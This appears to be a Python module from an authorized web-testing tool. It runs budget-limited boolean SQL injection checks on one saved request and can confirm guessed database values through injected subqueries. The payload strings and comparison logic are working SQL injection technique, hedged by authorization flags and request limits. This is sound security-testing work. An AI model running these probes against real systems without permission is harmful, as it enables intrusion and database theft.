"""WEB03: opt-in, fixed-budget boolean SQL injection checks on one saved request."""

import base64
import hashlib
import http.client
import re
import socket
import ssl
import time
from urllib.parse import parse_qsl, quote_plus, unquote_plus, urlsplit

from ..web import _request
from .web_static import _origin


MAX_BODY = 8192
_IDENTIFIER = re.compile(r'[A-Za-z_][A-Za-z0-9_]{0,63}\Z')
_CANDIDATE = re.compile(r'[A-Za-z0-9_{}./@:-]{1,64}\Z')


def _replace(form, parameter, value):
    pairs = parse_qsl(form, keep_blank_values=True, strict_parsing=True)
    if len(pairs) > 16 or sum(key == parameter for key, _ in pairs) != 1:
        raise ValueError('selected parameter must occur exactly once among at most 16 fields')
    return '&'.join(part.split('=', 1)[0] + '=' + quote_plus(value)
                    if unquote_plus(part.split('=', 1)[0]) == parameter else part
                    for part in form.split('&'))


def _validate(raw, origin, parameter, location, context, authorized, test_mode,
              table, column, candidates, timeout, max_requests, rate):
    if authorized is not True or test_mode is not True:
        raise ValueError('WEB03 requires an authorized origin and explicit test mode')
    if not isinstance(raw, bytes) or len(raw) > 64 * 1024:
        raise ValueError('saved request must be at most 64 KiB')
    parsed_origin = _origin(origin)
    request, body = _request(raw, origin)
    method = request['method']
    if method not in ('GET', 'POST') or location not in ('query', 'form') or context not in ('text', 'number'):
        raise ValueError('WEB03 supports GET/POST query or POST form with text/number context')
    if location == 'form' and (method != 'POST' or not any(
            key.lower() == 'content-type' and
            value.lower().split(';', 1)[0].strip() == 'application/x-www-form-urlencoded'
            for key, value in request['headers'].items())):
        raise ValueError('form probes require an application/x-www-form-urlencoded POST')
    if method == 'POST' and location != 'form':
        raise ValueError('POST probes currently require a selected form parameter')
    if body and method == 'GET':
        raise ValueError('GET probes cannot carry a request body')
    try:
        first = raw.split(b'\n', 1)[0].rstrip(b'\r').decode('ascii')
        target = first.split(' ')[1]
        form = body.decode('ascii') if location == 'form' else urlsplit(target).query
    except (UnicodeError, IndexError) as exc:
        raise ValueError('request target/form must be ASCII') from exc
    if not isinstance(parameter, str) or not _IDENTIFIER.fullmatch(parameter):
        raise ValueError('selected parameter must be a bounded name')
    pairs = parse_qsl(form, keep_blank_values=True, strict_parsing=True)
    values = [value for key, value in pairs if key == parameter]
    if len(values) != 1 or len(pairs) > 16 or not re.fullmatch(r'[A-Za-z0-9_-]{1,64}', values[0]):
        raise ValueError('selected parameter needs one simple saved value')
    recovery = table is not None or column is not None or candidates is not None
    if recovery and (not isinstance(table, str) or not _IDENTIFIER.fullmatch(table) or
                     not isinstance(column, str) or not _IDENTIFIER.fullmatch(column) or
                     not isinstance(candidates, list) or not 1 <= len(candidates) <= 4 or
                     any(not isinstance(item, str) or not _CANDIDATE.fullmatch(item)
                         for item in candidates) or len(set(candidates)) != len(candidates)):
        raise ValueError('selected recovery needs one table/column and 1 to 4 bounded candidates')
    if (not isinstance(timeout, (int, float)) or isinstance(timeout, bool) or
            not 0 < timeout <= 30 or type(max_requests) is not int or
            not 6 <= max_requests <= 14 or not isinstance(rate, (int, float)) or
            isinstance(rate, bool) or not 0 < rate <= 20):
        raise ValueError('WEB03 requires bounded time, request and rate budgets')
    if recovery and max_requests < 6 + 2 * len(candidates):
        raise ValueError('request budget cannot cover all selected recovery controls')
    _replace(form, parameter, values[0])
    return parsed_origin, request, target, form, body, values[0], recovery


def _probe(origin, parsed_origin, method, target, headers, body, role, deadline):
    row = {'role': role, 'request': {'method': method, 'target': target,
                                   'headers': dict(headers),
                                   'body_b64': base64.b64encode(body).decode('ascii')},
           'response': {'status': None, 'headers': {}, 'body_b64': None,
                        'body_sha256': None, 'bytes_read': 0, 'truncated': False},
           'error': None}
    connection = None
    try:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError
        origin_parts = urlsplit(origin)
        connection = (http.client.HTTPSConnection(origin_parts.hostname, parsed_origin[2], timeout=remaining)
                      if parsed_origin[0] == 'https' else
                      http.client.HTTPConnection(origin_parts.hostname, parsed_origin[2], timeout=remaining))
        connection.request(method, target, body=body if method == 'POST' else None,
                           headers=headers)
        response = connection.getresponse()
        content = response.read(MAX_BODY + 1)
        row['response'].update(status=response.status,
                               headers={key.lower(): value for key, value in response.getheaders()
                                        if key.lower() in ('content-type', 'location')},
                               body_b64=base64.b64encode(content).decode('ascii'),
                               body_sha256=hashlib.sha256(content).hexdigest(),
                               bytes_read=len(content), truncated=len(content) > MAX_BODY)
    except (TimeoutError, socket.timeout, OSError, http.client.HTTPException, ssl.SSLError) as exc:
        row['error'] = type(exc).__name__
    finally:
        if connection is not None:
            connection.close()
    return row


def _signature(row):
    response = row['response']
    if (row['error'] or response['truncated'] or response['status'] in (None, 429, 503) or
            response['status'] >= 500 or response['status'] in (301, 302, 303, 307, 308)):
        return None
    return response['status'], response['bytes_read'], response['body_sha256']


def assess_sql(raw_request, scope_origin, parameter, *, authorized=False, test_mode=False,
               location='query', context='text', table=None, column=None, candidates=None,
               timeout=10, max_requests=14, rate=5):
    """Return private exact probes; a differential is a lead, not challenge acceptance."""
    parsed, request, target, form, body, original, recovery = _validate(
        raw_request, scope_origin, parameter, location, context, authorized, test_mode,
        table, column, candidates, timeout, max_requests, rate)
    delimiter = "' AND " if context == 'text' else ' AND '
    expressions = [('baseline', original),
                   ('true', original + delimiter + "'1'='1" if context == 'text'
                    else original + delimiter + '1=1'),
                   ('false', original + delimiter + "'1'='2" if context == 'text'
                    else original + delimiter + '1=2')] * 2
    report = {'status': 'partial', 'classification': 'inconclusive',
              'origin': scope_origin, 'parameter': parameter, 'location': location,
              'context': context, 'request_sha256': hashlib.sha256(raw_request).hexdigest(),
              'requests_used': 0, 'budget': {'timeout': timeout,
                                           'max_requests': max_requests, 'rate': rate},
              'probes': [], 'selected_value': None}
    warnings = []
    deadline = time.monotonic() + timeout
    next_request = time.monotonic()

    def send(role, value):
        nonlocal next_request
        if report['requests_used'] >= max_requests or time.monotonic() >= deadline or next_request >= deadline:
            warnings.append('WEB03 request/time budget exhausted')
            return False
        time.sleep(min(max(0, next_request - time.monotonic()),
                       max(0, deadline - time.monotonic())))
        if time.monotonic() >= deadline:
            warnings.append('WEB03 time budget exhausted')
            return False
        changed = form if role == 'baseline' else _replace(form, parameter, value)
        selected_target = (target.split('?', 1)[0] + '?' + changed
                           if location == 'query' else target)
        selected_body = changed.encode('ascii') if location == 'form' else body
        if len(selected_target) > 2048 or len(selected_body) > 64 * 1024:
            warnings.append('WEB03 probe size limit reached')
            return False
        headers = {**request['headers'], 'Host': urlsplit(scope_origin).netloc,
                   'Connection': 'close'}
        if not any(key.lower() == 'accept-encoding' for key in headers):
            headers['Accept-Encoding'] = 'identity'
        if selected_body:
            headers['Content-Length'] = str(len(selected_body))
        started = time.monotonic()
        row = _probe(scope_origin, parsed, request['method'], selected_target,
                     headers, selected_body, role, deadline)
        report['probes'].append(row)
        report['requests_used'] += 1
        next_request = started + 1 / rate
        if row['error']:
            warnings.append(f"WEB03 request {report['requests_used']}: {row['error']}")
        return True

    for role, value in expressions:
        if not send(role, value):
            break
    if len(report['probes']) != 6:
        return report, warnings
    signatures = [_signature(row) for row in report['probes']]
    base = [signatures[0], signatures[3]]
    truth = [signatures[1], signatures[4]]
    false = [signatures[2], signatures[5]]
    if any(item is None for item in signatures) or base[0] != base[1] or truth[0] != truth[1] or false[0] != false[1]:
        warnings.append('WEB03 baseline or controls unstable, blocked or errored')
        return report, warnings
    report['status'] = 'complete'
    if base[0] == truth[0] and base[0] != false[0]:
        report['classification'] = 'differential_candidate'
    elif truth[0] == false[0]:
        report['classification'] = 'not_detected'
    else:
        report['status'] = 'partial'
        warnings.append('WEB03 controls differ without a stable baseline match')
    if not recovery or report['classification'] != 'differential_candidate':
        return report, warnings
    matches = []
    for candidate in candidates:
        predicate = f"""(SELECT "{column}" FROM "{table}" LIMIT 1)='{candidate}'"""
        payload = original + delimiter + predicate
        if context == 'text':
            payload += " AND '1'='1"
        if not send('selected:' + candidate, payload) or not send('selected:' + candidate, payload):
            report['status'] = 'partial'
            break
        pair = [_signature(row) for row in report['probes'][-2:]]
        if pair[0] is None or pair[0] != pair[1]:
            report['status'] = 'partial'
            warnings.append('WEB03 selected comparison unstable or blocked')
            continue
        if pair[0] == base[0]:
            matches.append(candidate)
        elif pair[0] != false[0]:
            report['status'] = 'partial'
            warnings.append('WEB03 selected comparison did not match either control')
    if len(matches) == 1 and report['status'] == 'complete':
        report['selected_value'] = matches[0]
    elif len(matches) > 1:
        report['status'] = 'partial'
        warnings.append('WEB03 multiple selected candidates matched')
    return report, warnings
